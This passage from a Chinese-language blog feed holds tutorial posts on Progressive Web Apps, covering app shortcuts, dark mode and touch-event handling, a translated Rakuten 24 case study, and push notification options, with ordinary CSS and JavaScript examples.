href="#shortcuts-配置驗證" class="headerlink" title="shortcuts 配置驗證"></a>shortcuts 配置驗證</h3><p>要看快速啟動選單 (App Shortcuts Menu) 有沒有配置正確，最快的方式就是透過開發者工具中 Application Panel 裡面的 Manifest 來查看，如下圖。</p><blockquote><p>shortcuts 配置驗證 (圖片來源: <a href="https://web-dev/">https://web-dev</a>)<br><img src="https://web-dev.imgix.net/image/admin/rEL0r8lEfYHlsj0ylLSL.png?auto=format&w=1098"></p></blockquote><h2 id="shortcuts-範例實做"><a href="#shortcuts-範例實做" class="headerlink" title="shortcuts 範例實做"></a>shortcuts 範例實做</h2><p>整個架構就蠻簡單的，稍微改寫官方範例，如下所示根目錄為<strong>彩色功能整合首頁</strong>然後其它顏色的路徑則為子功能。</p><p>原始檔: <a href="https://github.com/LinYenCheng/pwa-app-shortcuts">https://github.com/LinYenCheng/pwa-app-shortcuts</a><br>Demo 站台: <a href="https://linyencheng.github.io/pwa-app-shortcuts/">https://linyencheng.github.io/pwa-app-shortcuts/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── blue/</span><br><span class="line">│  └── index.html     # 藍色功能頁</span><br><span class="line">├── green/</span><br><span class="line">│  └── index.html     # 綠色功能頁</span><br><span class="line">├── red/</span><br><span class="line">│  └── index.html     # 紅色功能頁</span><br><span class="line">├── yellow/</span><br><span class="line">│  └── index.html     # 黃色功能頁</span><br><span class="line">├── index.html        # 彩色功能整合首頁</span><br><span class="line">├── manifest.json     # Web App 配置檔</span><br><span class="line">└── sw.js             # Service Worker</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="App-Shortcuts-順序安排"><a href="#App-Shortcuts-順序安排" class="headerlink" title="App Shortcuts 順序安排"></a>App Shortcuts 順序安排</h3><p>由於不同的平台目前針對啟動選單的數量有著不同的限制，所以會建議仔細思考並妥善安排捷徑在配置檔中陣列的順序。</p><ul><li>10 筆: Windows 的 Chrome、Edge</li><li>4 筆: Android 的 Chrome</li><li>3 筆: Android 7 的 Chrome 92</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 介面外觀</title>
      <link href="/2021/10/01/progressive-web-application/pwa-platform-look-and-feel/"/>
      <url>/2021/10/01/progressive-web-application/pwa-platform-look-and-feel/</url>
      
        <content type="html"><![CDATA[<p>網頁的外觀和操作本質上還是和原生的有差異但可以透過配置來讓體驗更接近。</p><ol><li>全螢幕模式</li><li>視覺設計</li><li>事件操作</li></ol><h2 id="全螢幕模式"><a href="#全螢幕模式" class="headerlink" title="全螢幕模式"></a>全螢幕模式</h2><p>全螢幕模式有兩種方式，Progressive Web App 尚未安裝前可以透過程式觸發，安裝後可以透過 display 配置安裝後的執行顯示模式。</p><ul><li>程式觸發全螢幕<ul><li><code>document.body.requestFullscreen();</code></li></ul></li><li>Progressive Web App 可以透過 manifest 的 display 設定<ul><li>fullscreen</li><li>standalone</li><li>minimal-ui</li></ul></li></ul><h2 id="視覺設計"><a href="#視覺設計" class="headerlink" title="視覺設計"></a>視覺設計</h2><p>Progressive Web App 主視覺、字形、操作上若配合系統會讓用戶能有較好且更一致的操作體驗。</p><ul><li>使用系統字形</li><li>配合系統主題</li><li>網址列顏色</li><li>樣式處理</li></ul><h3 id="使用系統字形"><a href="#使用系統字形" class="headerlink" title="使用系統字形"></a>使用系統字形</h3><p>字形的選用上非常容易影響到使用者的觀感，CSS 上可以透過 <code>system-ui</code> 來使用系統原生的字型。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>: system-ui;</span><br></pre></td></tr></table></figure><h3 id="配合系統主題"><a href="#配合系統主題" class="headerlink" title="配合系統主題"></a>配合系統主題</h3><p>當系統開啟暗黑模式後，PWA 也可以透過程式上的撰寫配合更改顯示設定，另外對於 AMOLED 的螢幕來說，暗黑模式也可以更省電。</p><p>程式上主要透過 Media Queries Level 5 支援的 prefers-color-scheme 可以判斷出使用者目前使用的系統主題。</p><ul><li>light: 明亮模式 (深色字體、淺色背景).</li><li>dark: 暗黑模式 (淺色字體、深色背景).</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&quot;(prefers-color-scheme)&quot;</span>).<span class="property">media</span> !== <span class="string">&quot;not all&quot;</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🎉 有支援暗黑模式&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">prefers-color-scheme</span>: dark) &#123;</span><br><span class="line">  <span class="selector-class">.day</span><span class="selector-class">.dark-scheme</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.night</span><span class="selector-class">.dark-scheme</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: black;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#ddd</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Google 有推出了一個 dark-mode-toggle 的模組，主要是靠 <code>Window.matchMedia()</code> 在實作相關邏輯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PREFERS_COLOR_SCHEME</span> = <span class="string">&quot;prefers-color-scheme&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MEDIA</span> = <span class="string">&quot;media&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LIGHT</span> = <span class="string">&quot;light&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DARK</span> = <span class="string">&quot;dark&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MQ_DARK</span> = <span class="string">`(<span class="subst">$&#123;PREFERS_COLOR_SCHEME&#125;</span>:<span class="subst">$&#123;DARK&#125;</span>)`</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MQ_LIGHT</span> = <span class="string">`(<span class="subst">$&#123;PREFERS_COLOR_SCHEME&#125;</span>:<span class="subst">$&#123;LIGHT&#125;</span>)`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 看瀏覽器是否支援暗黑模式</span></span><br><span class="line"><span class="keyword">const</span> hasNativePrefersColorScheme = <span class="title function_">matchMedia</span>(<span class="variable constant_">MQ_DARK</span>).<span class="property">media</span> !== <span class="variable constant_">NOT_ALL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hasNativePrefersColorScheme) &#123;</span><br><span class="line">  <span class="title function_">matchMedia</span>(<span class="variable constant_">MQ_DARK</span>).<span class="title function_">addListener</span>(<span class="function">(<span class="params">&#123; matches &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">mode</span> = matches ? <span class="variable constant_">DARK</span> : <span class="variable constant_">LIGHT</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">_dispatchEvent</span>(<span class="variable constant_">COLOR_SCHEME_CHANGE</span>, &#123; <span class="attr">colorScheme</span>: <span class="variable language_">this</span>.<span class="property">mode</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有興趣的大大也可以參考看看:</p><p><a href="https://github.com/GoogleChromeLabs/dark-mode-toggle">https://github.com/GoogleChromeLabs/dark-mode-toggle</a></p><blockquote><p>動畫來源: <a href="https://github.com/GoogleChromeLabs/dark-mode-toggle">https://github.com/GoogleChromeLabs/dark-mode-toggle</a><br><img src="https://user-images.githubusercontent.com/145676/94532333-0466b580-023e-11eb-947e-f73044a7cd63.gif"></p></blockquote><h3 id="網址列顏色"><a href="#網址列顏色" class="headerlink" title="網址列顏色"></a>網址列顏色</h3><p>PWA 中 manifest 的 theme_color 設定，可以客製化 Android Chrome 的網址列的顏色，注意要和 meta 中的顏色相同。</p><p><code>&lt;meta name=&quot;theme-color&quot; content=&quot;#3c553c&quot; /&gt;</code></p><h3 id="樣式處理"><a href="#樣式處理" class="headerlink" title="樣式處理"></a>樣式處理</h3><p>針對操作上的 UI 優化，可以針對常見三個狀態做樣式設定</p><ul><li><code>:hover</code></li><li><code>:focus</code></li><li><code>:active</code></li></ul><p>按鈕上也建議把預設的樣式拿掉。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn</span><span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* 把外面的框框拿掉 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  -webkit-tap-highlight-<span class="attribute">color</span>: transparent;</span><br><span class="line">  <span class="comment">/* 移除 highlight 的顏色 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件操作"><a href="#事件操作" class="headerlink" title="事件操作"></a>事件操作</h2><ul><li>文字選取</li><li>contextmenu</li><li>Touch 效果</li><li>Touch 事件</li></ul><h3 id="文字選取"><a href="#文字選取" class="headerlink" title="文字選取"></a>文字選取</h3><p>對於有觸控功能原生 APP 跟網頁最大的差別在很多文字是不能選取的，這時候我們也可以透過 CSS 針對這個部分進行設定。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 不給選 */</span></span><br><span class="line">user-<span class="selector-tag">select</span>: none;</span><br><span class="line"><span class="comment">/* 單擊一次選取 */</span></span><br><span class="line">user-<span class="selector-tag">select</span>: all;</span><br></pre></td></tr></table></figure><h3 id="contextmenu"><a href="#contextmenu" class="headerlink" title="contextmenu"></a>contextmenu</h3><p>避免長按跳出瀏覽器的 menu</p><ul><li>iOS</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webkit-touch-callout: none;</span><br></pre></td></tr></table></figure><ul><li>Android</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;contextmenu&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Touch-效果"><a href="#Touch-效果" class="headerlink" title="Touch 效果"></a>Touch 效果</h3><p>如果想要自訂義，就要把瀏覽器預設的樣式行為停用，要注意一但設為 none 變成要將很多細節去用 JS 執行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch-action: none;</span><br></pre></td></tr></table></figure><h3 id="Touch-事件"><a href="#Touch-事件" class="headerlink" title="Touch 事件"></a>Touch 事件</h3><p>越來越多裝置支援 touch 的行為，工程師在實作上其實就是針對觸控、手勢去實作相關事件。</p><ul><li>touches: 所有有按到手指的陣列<ul><li>force 壓力</li><li>座標</li><li>半徑座標</li></ul></li><li>targetTouches: 有按到 touch 事件的才會傳回來</li><li>changedTouches: 產生<strong>變化</strong>的觸碰點資訊，當離開時 <code>touches</code>、<code>targetTouches</code> 為空，所以只能透過 <code>changedTouches</code> 來理解最後發生的事情</li></ul><p>針對不同的事件去做相關的事件綁定，注意一下 touchMove 不等於 mouseMove，User Agent 會分派順序如下:</p><ol><li>touchstart</li><li>touchmove: 觸發的次數很多，要注意是否影響原來的效能</li><li>touchend</li><li>mousemove: cursor 移動</li><li>mousedown</li><li>mouseup</li><li>click</li></ol><p>要注意的細節如下</p><ul><li>減少在 touchstart 就做事件處理，因為這個階段也抓不到其他手指的事件</li><li>如果 touchStart 就 <code>preventDefault()</code> 會讓滑鼠事件 click 消失，但不 <code>preventDefault()</code> 又會同時觸發 touch 跟 click，這時候就需要看情境特別處理，像是 <code>preventDefault()</code> 後在 touch 事件的 callback 中決定是否要用程式去觸發 click</li><li>觸控至少要設計間距要超過 <code>5px</code> 比較不會誤觸，可以用增加 padding 的方式</li><li>300ms 延遲是怎麼來的，原因是因為 UA 要去判斷是否現在是在做更進階的動作，像是長按、點兩下等，如果直接監聽 touch 事件去做 click 事件就不會有這個延遲時間。或是透過 meta 設定不給縮放 (<code>user-scalable=no</code>) 就不會發生。</li></ul><p><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,user-scalable=no&quot;&gt;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判斷是否支援</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">PointerEvent</span>) &#123;</span><br><span class="line">  <span class="comment">// Pointer Event</span></span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">&quot;pointerdown&quot;</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleGestureStart</span>,</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  );</span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">&quot;pointermove&quot;</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleGestureMove</span>,</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  );</span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(<span class="string">&quot;pointerup&quot;</span>, <span class="variable language_">this</span>.<span class="property">handleGestureEnd</span>, <span class="literal">true</span>);</span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">&quot;pointercancel&quot;</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleGestureEnd</span>,</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 手指觸控螢幕觸發，只有一隻手指也會</span></span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">&quot;touchstart&quot;</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleGestureStart</span>,</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  );</span><br><span class="line">  <span class="comment">// 手指在螢幕上滑動時連續觸發，一次 move 期間一秒 60 次</span></span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(<span class="string">&quot;touchmove&quot;</span>, <span class="variable language_">this</span>.<span class="property">handleGestureMove</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// 離開螢幕時觸發</span></span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(<span class="string">&quot;touchend&quot;</span>, <span class="variable language_">this</span>.<span class="property">handleGestureEnd</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// 當系統停止監聽時觸發，比較少遇到，可能的情境像是接電話的時候</span></span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">&quot;touchcancel&quot;</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleGestureEnd</span>,</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mouse Listener</span></span><br><span class="line">  swipeFrontElement.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">&quot;mousedown&quot;</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleGestureStart</span>,</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 個案分析</title>
      <link href="/2021/09/30/progressive-web-application/pwa-case-study-rakuten-24/"/>
      <url>/2021/09/30/progressive-web-application/pwa-case-study-rakuten-24/</url>
      
        <content type="html"><![CDATA[<p>小編在讀 PWA 相關技術文章的時候，剛好讀到了樂天 24 這篇導入 PWA 的個案分析。</p><p>樂天 24 是樂天集團底下的一個電商平台，主要銷售日常快速消費品，也就是常見的 FMCG 產業，這類型的產品不外乎變化步調快速、品牌競爭挑戰性高。</p><p>沒想到導入之後樂天增加 450% 的用戶留存，效果竟然如此之好 Orz 所以就決定來翻譯一波，大家一起來看看樂天 24 是怎麼導入 PWA 的吧!</p><p>這篇文章翻譯自以下網站:</p><p><a href="https://web.dev/rakuten-24/">https://web.dev/rakuten-24/</a></p><h2 id="PWA-的機會（Opportunity）"><a href="#PWA-的機會（Opportunity）" class="headerlink" title="PWA 的機會（Opportunity）"></a>PWA 的機會（Opportunity）</h2><ul><li>因為是新服務，所以不一定需要去投資和維護多平台 App，PWA 就成為了可能的解決方案</li><li>樂天算是很大的電商平台，所以樂天 24 被認為應該能有更高的用戶留存</li></ul><h2 id="PWA-技術導入"><a href="#PWA-技術導入" class="headerlink" title="PWA 技術導入"></a>PWA 技術導入</h2><p>為了抓住前面提到的兩個機會，所以樂天 24 就開始導入的 PWA 的相關技術，主要是兩個方面</p><ul><li>可被安裝，當 Web App 能被安裝後，對電商網站來說可能比較顯著的好處是:<ul><li>增加網站流量</li><li>增加用戶留存</li><li>增加客單價</li><li>增加轉換</li></ul></li><li>離線快取</li></ul><h3 id="可以安裝的樂天-24"><a href="#可以安裝的樂天-24" class="headerlink" title="可以安裝的樂天 24"></a>可以安裝的樂天 24</h3><p>作為一個品牌電商網站，會想要更彈性的去控制<a href="/2021/09/04/pwa-promoting-installation/?utm_source=link&utm_medium=article&utm_campaign=internal_link">推薦安裝提示</a>，所以樂天 24 的團隊選擇自行實作 <code>beforeinstallprompt</code> 的相關事件，正因如此也有辦法知道用戶目前是使用 Android 或 iOS 的平台，可以更進一步的提供相關且更好的體驗給用戶。</p><p>有興趣的大大可以連到以下站台看看精美的說明:<br><a href="https://24.rakuten.co.jp/addto/">https://24.rakuten.co.jp/addto/</a></p><blockquote><p>客製的安裝提示和相關說明 (圖片來源: <a href="https://web.dev/rakuten-24/">https://web.dev/rakuten-24/</a>)<br><img src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/APDhzk6SjyxQTgxVidFR.png?auto=format&w=1098" alt="推薦安裝"></p></blockquote><h3 id="PWA-離線快取"><a href="#PWA-離線快取" class="headerlink" title="PWA 離線快取"></a>PWA 離線快取</h3><p>樂天 24 的團隊主要是使用 Workbox 來操作 service workers，目的是確保用戶在網路不好甚至是斷線狀況也能夠也基本的操作體驗。</p><ul><li>對於網站相關的資源像是 JS 或是 CSS 主要採取 <code>cache-first</code> 的策略</li><li>對於不常更動的圖片則是使用 <code>stale-while-revalidate</code>，表示用戶可以接受過期回應，但同時在背景檢查最新版本</li></ul><p>Workbox 提供的 API 遠遠好過自己維護相關腳本，此外透過 <code>workbox-webpack-plugin</code> 這套外掛也能夠確保跨瀏覽器的基本支援。</p><p><a href="https://developers.google.com/web/tools/workbox">Workbox</a> 是由 google 開發維護，是一套用來強化 service worker 的工具包，方便我們更快實作出 production-ready 的 Service Worker，幾種常見的快取都已經提供相關範例，其實我們只需要照抄即可。</p><ul><li>Cache Google Fonts</li><li>Cache JavaScript and CSS</li><li>Cache Images</li><li>Precache your Files</li><li>Offline Google Analytics</li></ul><h2 id="PWA-經營成果"><a href="#PWA-經營成果" class="headerlink" title="PWA 經營成果"></a>PWA 經營成果</h2><p>在導入 PWA 後觀察一個月，比較基準為有安裝 PWA 以及沒安裝 PWA 的用戶。</p><ul><li>相對使用瀏覽器，每個使用者平均增加 310% 的瀏覽頻率</li><li>相對之前行動版網站，增加了 450% 的用戶留存</li><li>150% 的客單價提升</li><li>200% 的轉換率提高</li></ul><blockquote><p>經營成果 (圖片來源: <a href="https://web.dev/rakuten-24/">https://web.dev/rakuten-24/</a>)<br><img src="https://web-dev.imgix.net/image/tcFciHGuF3MxnTr1y5ue01OGLBn2/l49plmwrrFO3V953MQZD.png?auto=format&w=1098" alt="PWA經營成果"></p></blockquote><p>對於品牌經營來說，透過可被安裝的 PWA 能夠</p><ul><li>提升品牌意識: 用戶能夠透過主畫面的 Icon 去存取樂天 24 的服務</li><li>效率和成本降低: 樂天 24 不需要再去負擔維護雙平台 App 的成本</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 推播通知行為</title>
      <link href="/2021/09/29/progressive-web-application/pwa-notification-behavior-patterns/"/>
      <url>/2021/09/29/progressive-web-application/pwa-notification-behavior-patterns/</url>
      
        <content type="html"><![CDATA[<h2 id="推播通知行為"><a href="#推播通知行為" class="headerlink" title="推播通知行為"></a>推播通知行為</h2><p>推播通知行為主要分成視覺、後續事件兩大部分，前幾天的文章開箱了:</p><ul><li><a href="https://linyencheng.github.io/2021/09/25/progressive-web-application/pwa-notification/?utm_source=link&utm_medium=article&utm_campaign=internal_link">通知選項視覺</a></li><li><a href="https://linyencheng.github.io/2021/09/27/progressive-web-application/pwa-push-notificatoin-server/?utm_source=link&utm_medium=article&utm_campaign=internal_link">後端推播伺服器實作</a></li><li><a href="https://linyencheng.github.io/2021/09/28/progressive-web-application/pwa-push-notificatoin-client/?utm_source=link&utm_medium=article&utm_campaign=internal_link">處理推播事件</a></li></ul><p>這篇文章主要會更進一步解說視覺上可以進行設定的參數，以及收到通知後的行為，關於行為相關的參數如下。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;//&quot;</span><span class="punctuation">:</span> <span class="string">&quot;行為相關參數&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;String&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;renotify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Boolean&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Anything&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;requireInteraction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;boolean&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;silent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Boolean&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;//&quot;</span><span class="punctuation">:</span> <span class="string">&quot;視覺與行為參數&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;actions&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Array of Strings&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如果擔心覺得太抽象，歡迎先用以下連結的通知產生器先試玩:<br><a href="https://tests.peter.sh/notification-generator/">https://tests.peter.sh/notification-generator/</a></p><p>這次的 Demo 連結如下也歡迎各位大大試玩看看:<br><a href="https://linyencheng-push-notification.herokuapp.com/">https://linyencheng-push-notification.herokuapp.com/</a></p><h2 id="通知行為設定"><a href="#通知行為設定" class="headerlink" title="通知行為設定"></a>通知行為設定</h2><p>除了單純 UI 顯示相關的參數以外，接下來介紹一些會影響流程的相關參數:</p><ul><li>通知分組 (Tag)</li><li>重複通知 (Renotify)</li><li>通知動作 (Actions)</li><li>靜音通知設定 (Silent)</li><li>通知互動設定 (Require Interaction)</li></ul><h3 id="通知分組-Tag"><a href="#通知分組-Tag" class="headerlink" title="通知分組 (Tag)"></a>通知分組 (Tag)</h3><p>Tag 這個設定是方便讓訊息不要一直疊加，只要有同個 Tag 的新訊息就會關掉舊的並用新的取代，要注意的是後面取代的通知都不會觸發裝置的聲音或是震動。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> title = <span class="string">&quot;Notification 1 of 3&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&quot;With &#x27;tag&#x27; of &#x27;message-group-1&#x27;&quot;</span>,</span><br><span class="line">  <span class="attr">tag</span>: <span class="string">&quot;message-group-1&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line">registration.<span class="title function_">showNotification</span>(title, options);</span><br></pre></td></tr></table></figure><h3 id="重複通知-Renotify"><a href="#重複通知-Renotify" class="headerlink" title="重複通知 (Renotify)"></a>重複通知 (Renotify)</h3><p>因為 Tag 的實作不會觸發聲音或是震動，在聊天軟體中的某些情況下需要再次被叮咚，所以在 tag 的基礎上增加了 <code>renotify</code> 這個配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> title = <span class="string">&quot;Notification 2 of 2&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">tag</span>: <span class="string">&quot;renotify&quot;</span>,</span><br><span class="line">  <span class="attr">renotify</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line">registration.<span class="title function_">showNotification</span>(title, options);</span><br></pre></td></tr></table></figure><h3 id="靜音通知設定-Silent"><a href="#靜音通知設定-Silent" class="headerlink" title="靜音通知設定 (Silent)"></a>靜音通知設定 (Silent)</h3><p>停用震動、鈴聲硬體通知。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> title = <span class="string">&quot;Silent Notification&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">silent</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line">registration.<span class="title function_">showNotification</span>(title, options);</span><br></pre></td></tr></table></figure><h3 id="通知互動設定-Require-Interaction"><a href="#通知互動設定-Require-Interaction" 